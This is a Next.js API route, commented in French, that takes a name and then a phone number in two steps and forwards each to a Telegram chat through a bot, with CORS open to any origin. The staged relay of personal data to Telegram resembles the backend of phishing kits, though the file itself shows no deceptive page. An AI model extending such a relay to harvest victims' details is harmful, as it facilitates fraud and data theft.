// pages/api/webhook.js
export default async function handler(req, res) {
  // Autorisations CORS (pour ton localhost et Netlify)
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end(); // Réponse au preflight
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Méthode non autorisée" });
  }

  try {
    const { type, payload } = req.body || {};

    if (!type || !payload) {
      return res.status(400).json({ error: "Requête invalide : { type, payload } attendu" });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ error: "Configuration Telegram manquante" });
    }

    // Construire le message selon le type
    let text = "";
    if (type === "contact_info") {
      text = `📨 Étape 1 — Coordonnées\n\n👤 Nom : ${payload.nom}\n👤 Prénom : ${payload.prenom}`;
    } else if (type === "phone") {
      text = `📱 Étape 2 — Téléphone\n\nNuméro : ${payload.phone}`;
    } else {
      return res.status(400).json({ error: "Type inconnu. Utilisez contact_info ou phone." });
    }

    // Envoi à Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });

    if (!response.ok) {
      const errText = await response.text();
      return res.status(500).json({ error: "Erreur Telegram", details: errText });
    }

    return res.status(200).json({ success: true, message: "Données envoyées à Telegram" });
  } catch (err) {
    console.error("Erreur webhook:", err);
    return res.status(500).json({ error: "Erreur serveur", details: err.message });
  }
}
